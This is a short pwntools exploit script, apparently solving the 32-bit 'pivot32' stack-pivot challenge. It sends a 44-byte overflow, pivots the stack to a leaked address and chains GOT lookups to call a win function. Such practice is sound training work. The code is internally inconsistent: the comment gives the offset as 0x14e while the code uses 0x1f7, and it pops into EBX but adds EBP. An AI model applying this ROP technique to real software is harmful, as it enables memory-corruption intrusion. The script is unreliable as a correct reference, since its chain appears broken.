from pwn import *

foothold_plt     = 0x80485f0
foothold_got_plt = 0x804a024

pop_eax      = 0x080488c0 # pop eax ; ret
pop_ebx      = 0x08048571 # pop ebx ; ret

xchg_eax_esp = 0x080488c2 # xchg esp, eax ; ret
mov_eax      = 0x080488c4 # mov eax, [eax] ; ret
add_eax_ebp  = 0x080488c7 # add eax, ebp ; ret
call_eax     = 0x080486a3 # call eax

# Start process and send rop chain
e = process('pivot32')

text = e.recv()
print text
pivot = int(text.splitlines()[4].split()[-1], 16)
print "[+] Pivot is " + hex(pivot)

# Uncomment to attach GDB
gdb.attach(e, 'break *pwnme+174')

# Stage 2 is loaded first, but since we already have our pivot address, we can focus on constructing the second stage payload.
# rop_stage2 calls foothold_function() to populate its GOT entry, then queries that value into EAX
# Since we have the lib, the offset between foothold_function() and ret2win is 0x14e.
# Add that to the queried value then call EAX
rop_stage2 = p32(foothold_plt)
rop_stage2 += p32(pop_eax)
rop_stage2 += p32(foothold_got_plt)
rop_stage2 += p32(mov_eax)
rop_stage2 += p32(pop_ebx)
rop_stage2 += p32(0x1f7)
rop_stage2 += p32(add_eax_ebp)
rop_stage2 += p32(call_eax)

e.sendline(rop_stage2)

# Stage 1 ROP: Jump to pivot by exchanging ESP with EAX
rop_stage1 = "A" * 44
rop_stage1 += p32(pop_eax)
rop_stage1 += p32(pivot)
rop_stage1 += p32(xchg_eax_esp)

e.sendline(rop_stage1)

# If you're trying to get a shell remove this line and call e.interactive()
print e.recvall()
